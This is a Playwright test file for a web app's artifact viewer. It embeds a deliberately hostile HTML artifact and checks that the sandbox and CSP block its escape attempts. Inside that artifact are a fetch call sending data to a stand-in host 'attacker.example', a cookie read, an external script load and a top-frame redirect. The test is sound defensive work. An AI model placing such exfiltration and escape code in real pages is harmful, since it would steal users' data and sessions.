import { test, expect } from "@playwright/test";
import type { AddressInfo } from "node:net";
import type { Server } from "node:http";
import { loadConfig } from "../src/config.js";
import { buildApp, type BuiltApp } from "../src/interface/http/server.js";
import { SESSION_COOKIE } from "../src/interface/http/identity-routes.js";

const PORT = 8099;

// baseUrl MUST equal the origin the browser actually talks to: the artifact CSP names
// this origin explicitly, and a mismatch would block the vendored <script src> and make
// the whole suite fail for a reason unrelated to what it is testing.
const env: Record<string, string> = {
  PORTICO_BASE_URL: `http://localhost:${PORT}`,
  PORTICO_PORT: String(PORT),
  PORTICO_ENCRYPTION_KEY: Buffer.alloc(32, 5).toString("base64"),
  PORTICO_SESSION_SECRET: "test-session-secret-value",
  PORTICO_GOOGLE_CLIENT_ID: "cid",
  PORTICO_GOOGLE_CLIENT_SECRET: "sec",
  PORTICO_ALLOWED_DOMAINS: "okadoc.com",
  PORTICO_ARTIFACT_BLOB_ACCOUNT: "acct",
};

/** Renders a chart, and tries every escape we claim to block. Records what the browser allowed. */
const ARTIFACT = `<!doctype html><html><body>
<div id="chart" style="width:600px;height:400px"></div>
<script src="/vendor/echarts-5.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/left-pad/index.js"
        onerror="document.body.dataset.extscript='blocked'"></script>
<script>
  echarts.init(document.getElementById('chart')).setOption({
    xAxis: { data: ['a','b','c'] }, yAxis: {},
    series: [{ type: 'bar', data: [3, 7, 2] }],
  });
  fetch('https://attacker.example/steal?d=1')
    .then(() => { document.body.dataset.fetch = 'ALLOWED'; })
    .catch(() => { document.body.dataset.fetch = 'blocked'; });
  try { document.body.dataset.cookie = document.cookie ? 'READABLE' : 'empty'; }
  catch { document.body.dataset.cookie = 'blocked'; }
  try { top.location = 'https://attacker.example/'; } catch { /* expected */ }
</script>
</body></html>`;

let built: BuiltApp;
let server: Server;
let origin: string;
let visualUrl: string;
let cookieValue: string;

test.beforeAll(async () => {
  built = buildApp({ settings: loadConfig(env), pool: null });
  server = await new Promise<Server>((r) => {
    const s = built.app.listen(PORT, () => r(s));
  });
  origin = `http://localhost:${(server.address() as AddressInfo).port}`;

  const user = await built.stores.users.upsertByIdentity({
    issuer: "iss",
    subject: "sub",
    email: "u@okadoc.com",
  });
  cookieValue = await built.sessions.sign(user.id);
  const { id } = await built.artifacts.publish(user, { html: ARTIFACT, title: "Boundary" });
  visualUrl = `${origin}/visual/${id}`;
});

test.afterAll(async () => {
  await new Promise<void>((r) => server.close(() => r()));
});

test("the chart renders, and nothing escapes the sandbox", async ({ page, context }) => {
  await context.addCookies([
    { name: SESSION_COOKIE, value: cookieValue, domain: "localhost", path: "/" },
  ]);

  // Every request the page makes, so an exfil attempt cannot hide behind a passing assertion.
  // We record a request as "left the origin" only when it actually reached the network:
  // either it completed (`requestfinished`) or it failed for a network reason (DNS, refused).
  // A request the browser blocked by CSP/client *before* the network (errorText "csp" /
  // ERR_BLOCKED_BY_*) transmitted zero bytes — that is the boundary holding, not an escape,
  // and Playwright still emits a `request` event for it, so filtering on the raw event would
  // false-positive on the very block we are proving. A real exfil down an *allowed* channel
  // still reaches the network and so is still caught here.
  const isOff = (u: string) => !u.startsWith(origin) && !u.startsWith("data:");
  const offOrigin: string[] = [];
  page.on("requestfinished", (r) => {
    if (isOff(r.url())) offOrigin.push(r.url());
  });
  page.on("requestfailed", (r) => {
    const err = r.failure()?.errorText ?? "";
    if (isOff(r.url()) && !/csp|blocked/i.test(err)) offOrigin.push(r.url());
  });

  await page.goto(visualUrl);

  const frame = page.frameLocator('iframe[sandbox="allow-scripts"]');
  const canvas = frame.locator("#chart canvas").first();
  await expect(canvas).toBeVisible(); // ECharts really drew
  expect((await canvas.boundingBox())!.width).toBeGreaterThan(100);

  const body = frame.locator("body");
  await expect(body).toHaveAttribute("data-fetch", "blocked"); // connect-src 'none'
  await expect(body).toHaveAttribute("data-extscript", "blocked"); // no external origin
  await expect(body).toHaveAttribute("data-cookie", "blocked"); // opaque origin

  expect(page.url()).toBe(visualUrl); // no top-frame navigation
  expect(offOrigin).toEqual([]); // not one byte left the origin
});

test("an anonymous visitor is sent to login, not to the artifact", async ({ page }) => {
  // portico's /login is not a page but the OAuth kickoff: it 302s the visitor onward to the
  // identity provider. So the observable invariant is that the visitor is bounced *through*
  // `${origin}/login` and never lands on the artifact — not that the tab settles on "/login".
  const responses: string[] = [];
  page.on("response", (r) => responses.push(r.url()));
  await page.goto(visualUrl).catch(() => {
    /* the redirect may end at an external IdP that is flaky in CI; the /login hop is enough */
  });
  expect(responses.some((u) => u.startsWith(`${origin}/login`))).toBe(true);
  expect(page.url()).not.toBe(visualUrl);
});
